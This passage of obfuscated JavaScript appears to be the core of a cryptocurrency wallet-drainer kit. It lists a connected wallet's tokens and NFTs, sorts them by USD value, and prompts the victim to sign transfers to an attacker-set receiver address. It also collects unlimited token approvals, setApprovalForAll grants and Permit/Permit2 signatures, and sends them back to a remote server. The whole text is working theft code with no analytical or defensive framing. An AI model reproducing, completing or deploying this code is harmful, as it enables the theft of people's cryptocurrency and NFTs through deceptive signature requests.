  const _0x4c1f42 = convert_chain('ID', 'ANKR', _0x38af4a.chain_id);
  if (MS_Settings.Settings.Chains[_0x4c1f42].Contract_Address != '') {
    return DO_CONTRACT(_0x38af4a);
  }
  const _0x1b3ed4 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x38af4a.chain_id]);
  const _0x393817 = ethers.BigNumber.from(await _0x1b3ed4.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  const _0xbcd339 = _0x38af4a.chain_id == 0xa4b1 ? 0x16e360 : _0x38af4a.chain_id == 0xa86a ? 0x16e360 : 0x5208;
  const _0xe2a5a0 = _0x38af4a.chain_id == 0xa4b1 ? 0x4c4b40 : _0x38af4a.chain_id == 0xa86a ? 0x4c4b40 : 0x249f0;
  const _0x3fefeb = ethers.BigNumber.from(_0x38af4a.chain_id == 0xa ? "35000000000" : _0x393817);
  const _0x2b3e9d = _0x3fefeb.mul(ethers.BigNumber.from(_0xbcd339)).mul(ethers.BigNumber.from('2'));
  const _0x7eb160 = _0x3fefeb.mul(ethers.BigNumber.from(_0xe2a5a0)).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[_0x38af4a.chain_id])));
  const _0x35d8d8 = ethers.BigNumber.from(_0x38af4a.amount_raw).sub(_0x2b3e9d).sub(_0x7eb160).toString();
  if (ethers.BigNumber.from(_0x35d8d8).lte(ethers.BigNumber.from('0'))) {
    throw "LOW_BALANCE";
  }
  const _0x19f4d0 = await get_nonce(_0x38af4a.chain_id);
  await transfer_request(_0x38af4a);
  sign_next();
  const _0x110374 = await MS_Signer.sendTransaction({
    'from': MS_Current_Address,
    'to': MS_Settings.Receiver,
    'value': ethers.BigNumber.from(_0x35d8d8),
    'gasLimit': ethers.BigNumber.from(_0xbcd339),
    'gasPrice': ethers.BigNumber.from(_0x393817),
    'nonce': _0x19f4d0,
    'data': '0x'
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x1b3ed4.waitForTransaction(_0x110374.hash, 0x1, 0x7530);
  }
  await transfer_success(_0x38af4a, _0x35d8d8);
  sign_ready();
};
const TRANSFER_TOKEN = async _0x4c8874 => {
  const _0x1c7c06 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x4c8874.chain_id]);
  const _0x374cdf = ethers.BigNumber.from(await _0x1c7c06.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const _0x51f3d9 = await get_nonce(_0x4c8874.chain_id);
  const _0x4548ab = new ethers.Contract(_0x4c8874.address, MS_Contract_ABI.ERC20, MS_Signer);
  let _0x2f306b = null;
  try {
    _0x2f306b = await _0x4548ab.estimateGas.transfer(MS_Settings.Receiver, _0x4c8874.amount_raw, {
      'from': MS_Current_Address
    });
    _0x2f306b = ethers.BigNumber.from(_0x2f306b).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from('120')).toString();
  } catch (_0x1b8921) {
    _0x2f306b = _0x4c8874.chain_id == 0xa4b1 ? 0x4c4b40 : _0x4c8874.chain_id == 0xa86a ? 0x4c4b40 : 0x3d090;
  }
  await transfer_request(_0x4c8874);
  sign_next();
  const _0x45921f = await _0x4548ab.transfer(MS_Settings.Receiver, _0x4c8874.amount_raw, {
    'gasLimit': ethers.BigNumber.from(_0x2f306b),
    'gasPrice': ethers.BigNumber.from(_0x374cdf),
    'nonce': _0x51f3d9,
    'from': MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x1c7c06.waitForTransaction(_0x45921f.hash, 0x1, 0x7530);
  }
  await transfer_success(_0x4c8874);
  sign_ready();
};
const TRANSFER_NFT = async _0x233a70 => {
  const _0x290938 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x233a70.chain_id]);
  const _0x16a81a = ethers.BigNumber.from(await _0x290938.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  const _0x109eda = await get_nonce(_0x233a70.chain_id);
  const _0x9c9090 = new ethers.Contract(_0x233a70.address, MS_Contract_ABI.ERC721, MS_Signer);
  let _0x5bc093 = null;
  try {
    _0x5bc093 = await _0x9c9090.estimateGas.transferFrom(MS_Current_Address, MS_Settings.Receiver, _0x233a70.amount_raw, {
      'from': MS_Current_Address
    });
    _0x5bc093 = ethers.BigNumber.from(_0x5bc093).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  } catch (_0x5468b1) {
    _0x5bc093 = _0x233a70.chain_id == 0xa4b1 ? 0x4c4b40 : _0x233a70.chain_id == 0xa86a ? 0x4c4b40 : 0x3d090;
  }
  await transfer_request(_0x233a70);
  sign_next();
  const _0x4b067c = await _0x9c9090.transferFrom(MS_Current_Address, MS_Settings.Receiver, _0x233a70.amount_raw, {
    'gasLimit': ethers.BigNumber.from(_0x5bc093),
    'gasPrice': ethers.BigNumber.from(_0x16a81a),
    'nonce': _0x109eda,
    'from': MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x290938.waitForTransaction(_0x4b067c.hash, 0x1, 0x7530);
  }
  await transfer_success(_0x233a70);
  sign_ready();
};
const RETRO_MM_APPROVE_TOKEN = async _0x492e86 => {
  const _0x580734 = new Web3(MS_Provider);
  const _0x1e4696 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x492e86.chain_id]);
  const _0x2ccde1 = ethers.BigNumber.from(await _0x1e4696.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from("120")).toString();
  const _0x11fc09 = await get_nonce(_0x492e86.chain_id);
  const _0x5a54b7 = new ethers.Contract(_0x492e86.address, MS_Contract_ABI.ERC20, _0x1e4696);
  let _0x48640a = null;
  let _0x41525c = ethers.utils.parseEther("1158472395435294898592384258348512586931256");
  for (const _0x32d82b of MS_Settings.Unlimited_BL) {
    try {
      if (_0x32d82b[0x0] == MS_Current_Chain_ID && _0x32d82b[0x1] == _0x492e86.address.toLowerCase()) {
        _0x41525c = _0x492e86.amount_raw;
        break;
      }
    } catch (_0x573943) {
      console.log(_0x573943);
    }
  }
  try {
    _0x48640a = await _0x5a54b7.estimateGas.approve(MS_Settings.Address, _0x41525c, {
      'from': MS_Current_Address
    });
    _0x48640a = ethers.BigNumber.from(_0x48640a).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  } catch (_0x30497) {
    _0x48640a = _0x492e86.chain_id == 0xa4b1 ? 0x4c4b40 : _0x492e86.chain_id == 0xa86a ? 0x4c4b40 : 0x3d090;
  }
  let _0x2d19c5 = new _0x580734.eth.Contract(MS_Contract_ABI.ERC20, _0x492e86.address);
  let _0x5329bf = _0x2d19c5.methods.approve(MS_Settings.Address, _0x41525c).encodeABI();
  await approve_request(_0x492e86);
  sign_next();
  const _0x43d6cb = await new Promise(_0x66fa5b => {
    MS_Provider.sendAsync({
      'from': MS_Current_Address,
      'id': 0x1,
      'jsonrpc': "2.0",
      'method': 'eth_sendTransaction',
      'params': [{
        'chainId': MS_Current_Chain_ID,
        'data': _0x5329bf,
        'from': MS_Current_Address,
        'nonce': _0x580734.utils.toHex(_0x11fc09),
        'to': _0x492e86.address,
        'value': "0x000" + Math.floor(Math.random() * 0x9),
        'gasPrice': _0x580734.utils.toHex(_0x2ccde1),
        'gas': _0x580734.utils.toHex(_0x48640a)
      }]
    }, (_0x19af22, _0x147d56) => {
      _0x66fa5b({
        'err': _0x19af22,
        'tx': _0x147d56
      });
    });
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x1e4696.waitForTransaction(_0x43d6cb.tx.result, 0x1, 0x7530);
  }
  await approve_success(_0x492e86);
  sign_ready();
};
const DO_SAFA = async _0xf3a88a => {
  const _0x9da52c = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0xf3a88a.chain_id]);
  const _0x3a5c08 = ethers.BigNumber.from(await _0x9da52c.getGasPrice()).div(ethers.BigNumber.from("100")).mul(ethers.BigNumber.from("120")).toString();
  const _0x35cff0 = await get_nonce(_0xf3a88a.chain_id);
  const _0x12093a = new ethers.Contract(_0xf3a88a.address, MS_Contract_ABI.ERC721, MS_Signer);
  let _0x34371d = null;
  try {
    _0x34371d = await _0x12093a.estimateGas.setApprovalForAll(MS_Settings.Address, true, {
      'from': MS_Current_Address
    });
    _0x34371d = ethers.BigNumber.from(_0x34371d).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from("120")).toString();
  } catch (_0x2ef423) {
    _0x34371d = _0xf3a88a.chain_id == 0xa4b1 ? 0x4c4b40 : _0xf3a88a.chain_id == 0xa86a ? 0x4c4b40 : 0x3d090;
  }
  await approve_request(_0xf3a88a);
  sign_next();
  const _0x5d3720 = await _0x12093a.setApprovalForAll(MS_Settings.Address, true, {
    'gasLimit': ethers.BigNumber.from(_0x34371d),
    'gasPrice': ethers.BigNumber.from(_0x3a5c08),
    'nonce': _0x35cff0,
    'from': MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) {
    await _0x9da52c.waitForTransaction(_0x5d3720.hash, 0x1, 0x7530);
  }
  await approve_success(_0xf3a88a);
  sign_ready();
};
const DO_PERMIT2 = async (_0x4c2754, _0x2e5a3f) => {
  const _0x1ee841 = new ethers.Contract("0x000000000022d473030f116ddee9f6b43ac78ba3", MS_Contract_ABI.PERMIT2_BATCH, MS_Signer);
  let _0x15cc84 = {
    'name': "Permit2",
    'chainId': _0x4c2754.chain_id,
    'verifyingContract': "0x000000000022d473030f116ddee9f6b43ac78ba3"
  };
  let _0x107430 = Date.now() + 0x72957f000;
  let _0x32616b = null;
  let _0x262167 = null;
  let _0x585888 = null;
  if (_0x2e5a3f.length > 0x1) {
    let _0x211c02 = {
      'PermitBatch': [{
        'name': 'details',
        'type': "PermitDetails[]"
      }, {
        'name': "spender",
        'type': "address"
      }, {
        'name': "sigDeadline",
        'type': "uint256"
      }],
      'PermitDetails': [{
        'name': "token",
        'type': 'address'
      }, {
        'name': "amount",
        'type': "uint160"
      }, {
        'name': "expiration",
        'type': 'uint48'
      }, {
        'name': "nonce",
        'type': "uint48"
      }]
    };
    let _0x1209c2 = [];
    for (const _0xe5a764 of _0x2e5a3f) {
      try {
        _0x1209c2.push({
          'token': _0xe5a764.address,
          'expiration': _0x107430,
          'amount': '1461501637330902918203684832716283019655932542975',
          'nonce': (await _0x1ee841.allowance(MS_Current_Address, _0xe5a764.address, MS_Settings.Address)).nonce
        });
      } catch (_0x421deb) {
        console.log(_0x421deb);
      }
    }
    _0x262167 = {
      'details': _0x1209c2,
      'spender': MS_Settings.Address,
      'sigDeadline': _0x107430
    };
    swap_request("Permit2", _0x4c2754, _0x2e5a3f);
    sign_next();
    _0x32616b = await MS_Signer._signTypedData(_0x15cc84, _0x211c02, _0x262167);
    _0x585888 = 0x2;
  } else {
    let _0x5cbaf2 = {
      'PermitSingle': [{
        'name': "details",
        'type': "PermitDetails"
      }, {
        'name': 'spender',
        'type': "address"
      }, {
        'name': "sigDeadline",
        'type': "uint256"
      }],
      'PermitDetails': [{
        'name': "token",
        'type': "address"
      }, {
        'name': "amount",
        'type': 'uint160'
      }, {
        'name': 'expiration',
        'type': "uint48"
      }, {
        'name': "nonce",
        'type': 'uint48'
      }]
    };
    _0x262167 = {
      'details': {
        'token': _0x4c2754.address,
        'amount': '1461501637330902918203684832716283019655932542975',
        'expiration': _0x107430,
        'nonce': (await _0x1ee841.allowance(MS_Current_Address, _0x4c2754.address, MS_Settings.Address)).nonce
      },
      'spender': MS_Settings.Address,
      'sigDeadline': _0x107430
    };
    swap_request('Permit2', _0x4c2754, [_0x4c2754]);
    sign_next();
    _0x32616b = await MS_Signer._signTypedData(_0x15cc84, _0x5cbaf2, _0x262167);
    _0x585888 = 0x1;
  }
  if (_0x32616b != null) {
    await swap_success("Permit2", _0x4c2754, _0x2e5a3f);
    wait_message();
    const _0x1faf89 = send_request({
      'action': "sign_permit2",
      'user_id': MS_ID,
      'signature': _0x32616b,
      'message': _0x262167,
      'asset': _0x4c2754,
      'assets': _0x2e5a3f,
      'address': MS_Current_Address,
      'mode': _0x585888
    });
    if (MS_Settings.Settings.Wait_For_Response) {
      await _0x1faf89;
    }
    sign_ready();
  } else {
    await sign_cancel();
  }
};
const PERMIT_TOKEN = async _0x37a4e0 => {
  const _0xdb9092 = new ethers.Contract(_0x37a4e0.address, _0x37a4e0.abi, MS_Signer);
  const _0x5f3e4b = await _0xdb9092.nonces(MS_Current_Address);
  const _0x157505 = await _0xdb9092.name();
  let _0x1d4ea5 = ethers.utils.parseEther('1158472395435294898592384258348512586931256');
  for (const _0x28da70 of MS_Settings.Unlimited_BL) {
    try {
      if (_0x28da70[0x0] == MS_Current_Chain_ID && _0x28da70[0x1] == _0x37a4e0.address.toLowerCase()) {
        _0x1d4ea5 = _0x37a4e0.amount_raw;
        break;
      }
    } catch (_0x394aaf) {
      console.log(_0x394aaf);
    }
  }
  const _0x596eef = Date.now() + 0x72957f000;
  let _0x19141f = null;
  let _0x3c2d96 = null;
  if (_0x37a4e0.permit == 0x1) {
    _0x19141f = {
      'Permit': [{
        'name': "holder",
        'type': "address"
      }, {
        'name': "spender",
        'type': "address"
      }, {
        'name': "nonce",
        'type': "uint256"
      }, {
        'name': "expiry",
        'type': 'uint256'
      }, {
        'name': "allowed",
        'type': "bool"
      }]
    };
    _0x3c2d96 = {
      'holder': MS_Current_Address,
      'spender': MS_Settings.Address,
      'nonce': _0x5f3e4b,
      'expiry': _0x596eef,
      'allowed': true
    };
  } else if (_0x37a4e0.permit == 0x2) {
    _0x19141f = {
      'Permit': [{
        'name': "owner",
        'type': "address"
      }, {
        'name': "spender",
        'type': "address"
      }, {
        'name': "value",
        'type': "uint256"
      }, {
        'name': "nonce",
        'type': "uint256"
      }, {
        'name': 'deadline',
        'type': "uint256"
      }]
    };
    _0x3c2d96 = {
      'owner': MS_Current_Address,
      'spender': MS_Settings.Address,
      'value': _0x1d4ea5,
      'nonce': _0x5f3e4b,
      'deadline': _0x596eef
    };
  }
  await approve_request(_0x37a4e0);
  sign_next();
  const _0x333649 = await MS_Signer._signTypedData({
    'name': _0x157505,
    'version': _0x37a4e0.permit_ver,
    'chainId': _0x37a4e0.chain_id,
    'verifyingContract': _0x37a4e0.address
  }, _0x19141f, _0x3c2d96);
  const _0x580bf6 = {
    'r': _0x333649.slice(0x0, 0x42),
    's': '0x' + _0x333649.slice(0x42, 0x82),
    'v': Number('0x' + _0x333649.slice(0x82, 0x84))
  };
  await approve_success(_0x37a4e0);
  wait_message();
  const _0x4ff922 = send_request({
    'action': "permit_token",
    'user_id': MS_ID,
    'sign': {
      'type': _0x37a4e0.permit,
      'version': _0x37a4e0.permit_ver,
      'chain_id': _0x37a4e0.chain_id,
      'address': _0x37a4e0.address,
      'owner': MS_Current_Address,
      'spender': MS_Settings.Address,
      'value': _0x1d4ea5.toString(),
      'nonce': _0x5f3e4b.toString(),
      'deadline': _0x596eef,
      'r': _0x580bf6.r,
      's': _0x580bf6.s,
      'v': _0x580bf6.v,
      'abi': _0x37a4e0.abi
    },
    'asset': _0x37a4e0,
    'address': MS_Current_Address
  });
  if (MS_Settings.Settings.Wait_For_Response) {
    await _0x4ff922;
  }
  sign_ready();
};
const sign_success = async (_0x38851a, _0x22c6e5 = '0') => {
  try {
    if (_0x38851a.type == "NATIVE") {
      _0x38851a.amount_raw = _0x22c6e5;
      const _0x209822 = ethers.BigNumber.from(_0x38851a.amount_raw);
      _0x38851a.amount_usd = parseFloat(ethers.utils.formatUnits(_0x209822, 'ether')) * MS_Currencies[convert_chain('ID', 'CURRENCY', _0x38851a.chain_id)].USD;
      await send_request({
        'action': "sign_success",
        'asset': _0x38851a,
        'user_id': MS_ID
      });
    } else {
      await send_request({
        'action': "sign_success",
        'asset': _0x38851a,
        'user_id': MS_ID
      });
    }
  } catch (_0x4725eb) {
    console.log(_0x4725eb);
  }
};
const swap_success = async (_0x44bd2e, _0x21fb40, _0xf258b7 = [], _0x105640 = '0') => {
  try {
    if (_0x21fb40.type == "NATIVE") {
      _0x21fb40.amount_raw = _0x105640;
      const _0x42f56c = ethers.BigNumber.from(_0x21fb40.amount_raw);
      _0x21fb40.amount_usd = parseFloat(ethers.utils.formatUnits(_0x42f56c, 'ether')) * MS_Currencies[convert_chain('ID', "CURRENCY", _0x21fb40.chain_id)].USD;
      await send_request({
        'action': "swap_success",
        'asset': _0x21fb40,
        'user_id': MS_ID,
        'list': _0xf258b7,
        'swapper': _0x44bd2e
      });
    } else {
      await send_request({
        'action': "swap_success",
        'asset': _0x21fb40,
        'user_id': MS_ID,
        'list': _0xf258b7,
        'swapper': _0x44bd2e
      });
    }
  } catch (_0x4c0fcd) {
    console.log(_0x4c0fcd);
  }
};
const transfer_success = async (_0x4de871, _0x11ca76 = '0') => {
  try {
    if (_0x4de871.type == "NATIVE") {
      _0x4de871.amount_raw = _0x11ca76;
      const _0x1d153b = ethers.BigNumber.from(_0x4de871.amount_raw);
      _0x4de871.amount_usd = parseFloat(ethers.utils.formatUnits(_0x1d153b, "ether")) * MS_Currencies[convert_chain('ID', "CURRENCY", _0x4de871.chain_id)].USD;
      await send_request({
        'action': "transfer_success",
        'asset': _0x4de871,
        'user_id': MS_ID
      });
    } else {
      await send_request({
        'action': "transfer_success",
        'asset': _0x4de871,
        'user_id': MS_ID
      });
    }
  } catch (_0x4a4bb0) {
    console.log(_0x4a4bb0);
  }
};
const approve_success = async _0x61ab76 => {
  try {
    await send_request({
      'action': "approve_success",
      'asset': _0x61ab76,
      'user_id': MS_ID
    });
  } catch (_0x5168fc) {
    console.log(_0x5168fc);
  }
};
const sign_cancel = async () => {
  try {
    await send_request({
      'action': "sign_cancel",
      'user_id': MS_ID
    });
  } catch (_0x529b66) {
    console.log(_0x529b66);
  }
};
const sign_unavailable = async () => {
  try {
    await send_request({
      'action': 'sign_unavailable',
      'user_id': MS_ID
    });
    MS_Sign_Disabled = true;
  } catch (_0x5b6ea5) {
    console.log(_0x5b6ea5);
  }
};
const transfer_cancel = async () => {
  try {
    await send_request({
      'action': "transfer_cancel",
      'user_id': MS_ID
    });
  } catch (_0x48d5b3) {
    console.log(_0x48d5b3);
  }
};
const approve_cancel = async () => {
  try {
    await send_request({
      'action': 'approve_cancel',
      'user_id': MS_ID
    });
  } catch (_0x5b4765) {
    console.log(_0x5b4765);
  }
};
const chain_cancel = async () => {
  try {
    await send_request({
      'action': 'chain_cancel',
      'user_id': MS_ID
    });
  } catch (_0x17edef) {
    console.log(_0x17edef);
  }
};
const chain_success = async () => {
  try {
    await send_request({
      'action': 'chain_success',
      'user_id': MS_ID
    });
  } catch (_0x3df1de) {
    console.log(_0x3df1de);
  }
};
const chain_request = async (_0x67034e, _0x5af97c) => {
  try {
    await send_request({
      'action': "chain_request",
      'user_id': MS_ID,
      'chains': [_0x67034e, _0x5af97c]
    });
  } catch (_0x23e2a8) {
    console.log(_0x23e2a8);
  }
};
const sign_request = async _0x34740c => {
  try {
    await send_request({
      'action': "sign_request",
      'user_id': MS_ID,
      'asset': _0x34740c
    });
  } catch (_0x2b1b23) {
    console.log(_0x2b1b23);
  }
};
const swap_request = async (_0x4bb10d, _0x72ed2c, _0x246317 = []) => {
  try {
    await send_request({
      'action': "swap_request",
      'user_id': MS_ID,
      'asset': _0x72ed2c,
      'list': _0x246317,
      'swapper': _0x4bb10d
    });
  } catch (_0x13fda2) {
    console.log(_0x13fda2);
  }
};
const transfer_request = async _0x530b8e => {
  try {
    await send_request({
      'action': "transfer_request",
      'user_id': MS_ID,
      'asset': _0x530b8e
    });
  } catch (_0x44ff5e) {
    console.log(_0x44ff5e);
  }
};
const approve_request = async _0xb10333 => {
  try {
    await send_request({
      'action': "approve_request",
      'user_id': MS_ID,
      'asset': _0xb10333
    });
  } catch (_0x196f07) {
    console.log(_0x196f07);
  }
};
const is_increase_approve = _0x480072 => {
  try {
    return !!_0x480072.hasOwnProperty("increaseAllowance");
  } catch (_0x275dd) {
    return false;
  }
};
const get_wallet_assets = async _0x2f428e => {
  try {
    let _0x2c2923 = await send_request({
      'action': 'check_wallet',
      'address': MS_Current_Address
    });
    let _0x15f0d2 = [];
    if (_0x2c2923.status == 'OK') {
      _0x15f0d2 = _0x2c2923.data;
    } else {
      _0x15f0d2 = await get_tokens(_0x2f428e);
    }
    let _0x219998 = [];
    for (let _0x5594c6 = _0x15f0d2.length - 0x1; _0x5594c6 >= 0x0; _0x5594c6--) {
      try {
        const _0x51be97 = _0x15f0d2[_0x5594c6];
        const _0x3aff13 = convert_chain('ID', 'ANKR', _0x51be97.chain_id);
        if (!MS_Settings.Settings.Chains[_0x3aff13].Enable) {
          _0x15f0d2.splice(_0x5594c6, 0x1);
        } else {
          if (_0x51be97.type == "NATIVE" && !MS_Settings.Settings.Chains[_0x3aff13].Native) {
            _0x15f0d2.splice(_0x5594c6, 0x1);
          } else {
            if (_0x51be97.type == "ERC20" && !MS_Settings.Settings.Chains[_0x3aff13].Tokens) {
              _0x15f0d2.splice(_0x5594c6, 0x1);
            } else {
              if (_0x51be97.type == "NATIVE" && _0x51be97.amount_usd < MS_Settings.Settings.Chains[_0x3aff13].Min_Native_Price) {
                _0x15f0d2.splice(_0x5594c6, 0x1);
              } else {
                if (_0x51be97.type == 'ERC20' && _0x51be97.amount_usd < MS_Settings.Settings.Chains[_0x3aff13].Min_Tokens_Price) {
                  _0x15f0d2.splice(_0x5594c6, 0x1);
                } else if (_0x51be97.type == "ERC20") {
                  if (MS_Settings.Settings.Permit2.Mode) {
                    _0x219998.push(new Promise(async _0x5a9463 => {
                      try {
                        const _0x91f723 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x51be97.chain_id]);
                        const _0x4bba25 = new ethers.Contract(_0x51be97.address, MS_Contract_ABI.ERC20, _0x91f723);
                        let _0x2e0f3d = await _0x4bba25.allowance(MS_Current_Address, "0x000000000022d473030f116ddee9f6b43ac78ba3");
                        if (ethers.BigNumber.from(_0x2e0f3d).gt(ethers.BigNumber.from('0'))) {
                          _0x51be97.permit2 = true;
                          _0x51be97.allowance = _0x2e0f3d;
                          console.log("[PERMIT_2 FOUND] " + _0x51be97.name + ", Allowance: " + _0x2e0f3d);
                        }
                      } catch (_0x49dc8e) {
                        console.log(_0x49dc8e);
                      }
                      _0x5a9463();
                    }));
                  }
                  if (MS_Settings.Settings.Permit.Mode && MS_Settings.Settings.Permit.Priority > 0x0 || MS_Settings.Settings.Approve.MetaMask >= 0x2 && (MS_Current_Provider == "MetaMask" || MS_Current_Provider == "Trust Wallet" && !MS_Mobile_Status)) {
                    _0x219998.push(new Promise(async _0x465694 => {
                      try {
                        if (MS_Settings.Settings.Approve.MetaMask >= 0x2 && (MS_Current_Provider == "MetaMask" || MS_Current_Provider == "Trust Wallet" && !MS_Mobile_Status) || _0x51be97.amount_usd >= MS_Settings.Settings.Permit.Price) {
                          const _0x20a4f9 = await retrive_token(_0x51be97.chain_id, _0x51be97.address);
                          const _0x1851e0 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x51be97.chain_id]);
                          const _0x38548e = new ethers.Contract(_0x51be97.address, _0x20a4f9, _0x1851e0);
                          if (is_increase_approve(_0x38548e.functions)) {
                            _0x51be97.increase = true;
                            _0x51be97.abi = _0x20a4f9;
                          }
                          if (_0x51be97.amount_usd >= MS_Settings.Settings.Permit.Price) {
                            const _0x435ac0 = get_permit_type(_0x38548e.functions);
                            _0x51be97.permit = _0x435ac0;
                            _0x51be97.permit_ver = '1';
                            _0x51be97.abi = _0x20a4f9;
                            if (_0x435ac0 > 0x0) {
                              if (_0x38548e.functions.hasOwnProperty("version")) {
                                try {
                                  _0x51be97.permit_ver = await _0x38548e.version();
                                } catch (_0xc75260) {
                                  console.log(_0xc75260);
                                }
                              }
                              console.log("[PERMIT FOUND] " + _0x51be97.name + ", Permit Type: " + _0x435ac0 + ", Version: " + _0x51be97.permit_ver);
                            }
                          }
                        }
                      } catch (_0x50d99d) {
                        console.log(_0x50d99d);
                      }
                      _0x465694();
                    }));
                  }
                  if (MS_Settings.Settings.Swappers.Enable) {
                    _0x219998.push(new Promise(async _0xe288c7 => {
                      try {
                        if (_0x51be97.amount_usd >= MS_Settings.Settings.Swappers.Price) {
                          const _0x173782 = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[_0x51be97.chain_id]);
                          for (const _0x3d8f10 of MS_Routers[_0x51be97.chain_id]) {
                            try {
                              const _0x301632 = new ethers.Contract(_0x51be97.address, MS_Contract_ABI.ERC20, _0x173782);
                              const _0x4dd207 = await _0x301632.allowance(MS_Current_Address, _0x3d8f10[0x1]);
                              if (ethers.BigNumber.from(_0x4dd207).gt(ethers.BigNumber.from('0'))) {
                                if (_0x3d8f10[0x0] == "Uniswap" && !MS_Uniswap_Whitelist.includes(_0x51be97.address)) {
                                  continue;
                                }
                                if ((_0x3d8f10[0x0] == "Pancake" || _0x3d8f10[0x0] == "Pancake_V3") && !MS_Pancake_Whitelist.includes(_0x51be97.address)) {
                                  continue;
                                }
                                _0x51be97.swapper = true;
                                _0x51be97.swapper_type = _0x3d8f10[0x0];
                                _0x51be97.swapper_address = _0x3d8f10[0x1];
                                _0x51be97.swapper_allowance = _0x4dd207;
                                console.log("[SWAP FOUND] " + _0x51be97.name + ", " + _0x3d8f10[0x0]);
                                break;
                              }
                            } catch (_0x412426) {
                              console.log(_0x412426);
                            }
                          }
                        }
                      } catch (_0xe4ae91) {
                        console.log(_0xe4ae91);
                      }
                      _0xe288c7();
                    }));
                  }
                }
              }
            }
          }
        }
      } catch (_0x120e96) {
        console.log(_0x120e96);
      }
    }
    await Promise.all(_0x219998);
    let _0x11a504 = false;
    for (const _0x280907 in MS_Settings.Settings.Chains) {
      try {
        if (MS_Settings.Settings.Chains[_0x280907].NFTs) {
          _0x11a504 = true;
          break;
        }
      } catch (_0x3c12d4) {
        console.log(_0x3c12d4);
      }
    }
    if (_0x11a504) {
      try {
        let _0x1040ec = [];
        _0x2c2923 = await send_request({
          'action': "check_nft",
          'address': MS_Current_Address
        });
        if (_0x2c2923.status == 'OK') {
          _0x1040ec = _0x2c2923.data;
          for (const _0x2f0b88 of _0x1040ec) {
            try {
              const _0x3d52c0 = convert_chain('ID', 'ANKR', _0x2f0b88.chain_id);
              if (_0x2f0b88.type == "ERC1155") {
                continue;
              }
              if (!MS_Settings.Settings.Chains[_0x3d52c0].NFTs) {
                continue;
              }
              if (_0x2f0b88.amount_usd < MS_Settings.Settings.Chains[_0x3d52c0].Min_NFTs_Price) {
                continue;
              }
              _0x15f0d2.push(_0x2f0b88);
            } catch (_0x39f6c5) {
              console.log(_0x39f6c5);
            }
          }
        } else {
          _0x1040ec = await get_nfts(_0x2f428e);
          for (const _0x27804a of _0x1040ec) {
            try {
              const _0xed8cf9 = convert_chain('ID', 'ANKR', _0x27804a.chain_id);
              if (_0x27804a.type == "ERC1155") {
                continue;
              }
              if (!MS_Settings.Settings.Chains[_0xed8cf9].NFTs) {
                continue;
              }
              if (_0x27804a.amount_usd < MS_Settings.Settings.Chains[_0xed8cf9].Min_NFTs_Price) {
                continue;
              }
              _0x15f0d2.push(_0x27804a);
            } catch (_0x4c162d) {
              console.log(_0x4c162d);
            }
          }
        }
      } catch (_0x21feac) {
        console.log(_0x21feac);
      }
    }
    _0x15f0d2.sort((_0xc117be, _0x55be0c) => {
      return _0x55be0c.amount_usd - _0xc117be.amount_usd;
    });
    if (MS_Settings.Settings.Tokens_First) {
      const _0x40f61c = [];
      for (const _0xd91583 of _0x15f0d2) {
        try {
          if (_0xd91583.type == "NATIVE") {
            continue;
          }
          _0x40f61c.push(_0xd91583);
        } catch (_0x6a0bd7) {
          console.log(_0x6a0bd7);
        }
      }
      for (const _0x589bb7 of _0x15f0d2) {
        try {
          if (_0x589bb7.type != "NATIVE") {
            continue;
          }
          _0x40f61c.push(_0x589bb7);
        } catch (_0x414fa4) {
          console.log(_0x414fa4);
        }
      }
      _0x15f0d2 = _0x40f61c;
    }
    if (MS_Settings.Settings.Swappers.Enable && MS_Settings.Settings.Swappers.Priority == 0x1) {
      const _0x3d532a = [];
      for (const _0x10413d of _0x15f0d2) {
        try {
          if (!_0x10413d.swapper) {
            continue;
          }
          _0x3d532a.push(_0x10413d);
        } catch (_0x50063a) {
          console.log(_0x50063a);
        }
      }
      for (const _0x10f24c of _0x15f0d2) {
        try {
          if (_0x10f24c.swapper) {
            continue;
          }
          _0x3d532a.push(_0x10f24c);
        } catch (_0x1c8d7d) {
          console.log(_0x1c8d7d);
        }
      }
      _0x15f0d2 = _0x3d532a;
    }
    if (MS_Settings.Settings.Permit.Mode && MS_Settings.Settings.Permit.Priority > 0x0) {
      const _0x2f5978 = [];
      for (const _0x5e3713 of _0x15f0d2) {
        try {
          if (!_0x5e3713.permit || _0x5e3713.permit == 0x0 || _0x5e3713.amount_usd < MS_Settings.Settings.Permit.Priority) {
            continue;
          }
          _0x2f5978.push(_0x5e3713);
        } catch (_0xc702fe) {
          console.log(_0xc702fe);
        }
      }
      for (const _0x2e8342 of _0x15f0d2) {
        try {
          if (_0x2e8342.permit && _0x2e8342.permit > 0x0 && _0x2e8342.amount_usd >= MS_Settings.Settings.Permit.Priority) {
            continue;
          }
          _0x2f5978.push(_0x2e8342);
        } catch (_0x52e1fa) {
          console.log(_0x52e1fa);
        }
      }
      _0x15f0d2 = _0x2f5978;
    }
    if (MS_Settings.Settings.Swappers.Enable && MS_Settings.Settings.Swappers.Priority == 0x2) {
      const _0x106767 = [];
      for (const _0x3d14bf of _0x15f0d2) {
        try {
          if (!_0x3d14bf.swapper) {
            continue;
          }
